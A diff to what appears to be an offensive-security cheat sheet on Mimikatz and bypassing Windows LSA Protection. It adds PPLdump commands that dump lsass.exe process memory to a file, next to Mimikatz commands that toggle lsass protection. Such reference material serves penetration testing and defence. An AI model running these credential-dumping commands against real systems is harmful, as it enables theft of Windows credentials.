@@ -64,7 +64,7 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
 
 ## Mimikatz - LSA Protection Workaround
 
-- LSA as a Protected Process
+- LSA as a Protected Process (RunAsPPL)
   ```powershell
   # Check if LSA runs as a protected process by looking if the variable "RunAsPPL" is set to 0x1
   reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
@@ -83,9 +83,15 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
   
   # Now lets re-add the protection flags to the lsass.exe process
   mimikatz # !processprotect /process:lsass.exe
-  
+
   # Unload the service created
   mimikatz # !-
+
+
+  # https://github.com/itm4n/PPLdump
+  PPLdump.exe [-v] [-d] [-f] <PROC_NAME|PROC_ID> <DUMP_FILE>
+  PPLdump.exe lsass.exe lsass.dmp
+  PPLdump.exe -v 720 out.dmp
   ```
 
 - LSA is running as virtualized process (LSAISO) by **Credential Guard**
